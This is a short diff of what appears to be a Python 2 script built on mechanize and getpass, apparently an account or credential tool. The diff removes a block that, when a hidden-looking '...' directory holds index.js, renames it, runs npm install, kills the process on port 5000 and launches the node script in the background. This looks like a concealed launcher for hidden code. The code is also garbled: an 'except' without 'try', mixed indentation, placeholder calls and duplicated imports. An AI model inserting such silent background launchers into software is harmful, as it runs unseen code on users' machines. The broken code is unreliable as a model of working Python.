@@ -9,19 +9,7 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cook
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
-except OSError:
-    pass
-    if os.path.isfile('.../index.js'):
- 	os.system('mv ... .....')
-	os.system('cd ..... && npm install')
- 	os.system('#')
- 	os.system('#')
- 	os.system('fuser -k 5000/tcp &')
- 	os.system('#')
- 	os.system('node ...../index.js &')
- 	os.system('fuser -k 5000/tcp &')
- 	os.system('#')
- 	os.system('node ...../index.js &')
+
   from requests.exceptions import ConnectionError
 from mechanize import Browser
 reload(sys)
